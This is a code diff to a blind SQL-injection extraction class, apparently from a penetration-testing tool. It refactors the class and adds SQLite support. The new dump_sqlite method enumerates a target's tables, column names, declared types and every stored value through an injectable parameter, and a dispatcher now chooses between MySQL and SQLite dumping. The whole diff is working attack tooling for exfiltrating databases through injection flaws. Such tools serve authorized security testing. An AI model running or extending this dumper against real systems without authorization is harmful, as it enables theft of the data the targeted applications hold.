@@ -26,6 +26,10 @@ class BlindExtractor:
         self.time = time
         self.boolean = boolean
         self.union = union
+        self.database_engine = ""
+
+    def set_database_engine(self, database_engine: str) -> None:
+        self.database_engine = database_engine
 
     def find_words(self, body: str, start: str, end: str, length: int) -> list[str]:
         """Find unique words matching a regex in the given text."""
@@ -34,7 +38,6 @@ class BlindExtractor:
 
     def find_db_elem_name(
         self,
-        url: str,
         param: str,
         ctx: InjectionContext,
         column_count: int,
@@ -76,9 +79,7 @@ class BlindExtractor:
             HEIGH_COL_VALUE_LENGTH if db_elem == "value" else HEIGH_ELEMENT_NAME_LENGTH
         )
 
-        name_length = get_chars_at_index(
-            param, ctx, name_length_expression, max_length
-        )
+        name_length = get_chars_at_index(param, ctx, name_length_expression, max_length)
 
         Logger.debug(
             f"Found database element's name length: {YELLOW}{name_length}{RESET}"
@@ -86,11 +87,11 @@ class BlindExtractor:
 
         # Better simply compute for each character if length is short
         if name_length < 5:
-            return get_name(param, ctx, expression, name_length)
+            return get_name(self.database_engine, param, ctx, expression, name_length)
 
         if body_containing_name:
             # Find the first and the last character in the database element's name
-            first_last_chars = get_chars(param, ctx, expression, [1, name_length])
+            first_last_chars = get_chars(self.database_engine, param, ctx, expression, [1, name_length])
 
             Logger.debug(
                 f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}"
@@ -118,7 +119,7 @@ class BlindExtractor:
                     corresponding_names: list[str] = []
 
                     second_and_one_before_last_chars = get_chars(
-                        param, ctx, expression, [2, name_length - 1]
+                        self.database_engine, param, ctx, expression, [2, name_length - 1]
                     )
 
                     Logger.debug(
@@ -139,7 +140,7 @@ class BlindExtractor:
                         return corresponding_names[0]
                     # Compute each character to find out the whole name
 
-        return get_name(param, ctx, expression, name_length)
+        return get_name(self.database_engine, param, ctx, expression, name_length)
 
     def dump_db_elem_entries(
         self,
@@ -190,7 +191,6 @@ class BlindExtractor:
             """
 
             db_elem_name = self.find_db_elem_name(
-                url,
                 param,
                 ctx,
                 column_count,
@@ -207,7 +207,7 @@ class BlindExtractor:
 
         return results
 
-    def dump_db_entries(
+    def dump_mysql(
         self,
         url: str,
         param: str,
@@ -236,7 +236,6 @@ class BlindExtractor:
             "FROM information_schema.schemata",
             "",
         )
-
 
         """
         Get the table names of the current database.
@@ -343,3 +342,119 @@ class BlindExtractor:
                             "values": values,
                         }
         return dump
+
+    def dump_sqlite(
+        self,
+        url: str,
+        param: str,
+        ctx: InjectionContext,
+        column_count: int,
+        nulls: str,
+        boolInjection: bool,
+    ) -> dict:
+        """Dump tables, columns, metadata, and values from a SQLite database."""
+
+        dump = {"main": {}}
+
+        # Get all user tables from SQLite's catalog.
+        table_names = self.dump_db_elem_entries(
+            url,
+            param,
+            ctx,
+            column_count,
+            nulls,
+            boolInjection,
+            "table",
+            "SELECT name",
+            "FROM sqlite_master",
+            "WHERE type='table' AND name NOT LIKE 'sqlite_%'",
+        )
+
+        for table in table_names:
+            dump["main"][table] = {}
+
+            sql_table = string_to_sql_char(table)
+
+            # Get column names and declared types.
+            column_names = self.dump_db_elem_entries(
+                url,
+                param,
+                ctx,
+                column_count,
+                nulls,
+                boolInjection,
+                "column",
+                "SELECT name",
+                f"FROM pragma_table_info({sql_table})",
+                "",
+            )
+
+            for column in column_names:
+                sql_column = string_to_sql_char(column)
+
+                # Get the declared SQLite type.
+                data_types = self.dump_db_elem_entries(
+                    url,
+                    param,
+                    ctx,
+                    column_count,
+                    nulls,
+                    boolInjection,
+                    "value",
+                    "SELECT type",
+                    f"FROM pragma_table_info({sql_table})",
+                    f"WHERE name = {sql_column}",
+                )
+
+                # Get the actual column values.
+                values = self.dump_db_elem_entries(
+                    url,
+                    param,
+                    ctx,
+                    column_count,
+                    nulls,
+                    boolInjection,
+                    "value",
+                    f'SELECT "{column}"',
+                    f'FROM "{table}"',
+                    "",
+                )
+
+                # SQLite does not have an equivalent to
+                # information_schema.columns.character_maximum_length.
+                dump["main"][table][column] = {
+                    "data_type": data_types[0] if data_types else None,
+                    "character_maximum_length": None,
+                    "values": values,
+                }
+
+        return dump
+
+    def dump_db(
+        self,
+        database_engine: str,
+        url: str,
+        param: str,
+        ctx: InjectionContext,
+        column_count: int,
+        nulls: str,
+        boolInjection: bool,
+    ) -> dict:
+        if database_engine.lower() == "sqlite":
+            return self.dump_sqlite(
+                url,
+                param,
+                ctx,
+                column_count,
+                nulls,
+                boolInjection,
+            )
+
+        return self.dump_mysql(
+            url,
+            param,
+            ctx,
+            column_count,
+            nulls,
+            boolInjection,
+        )
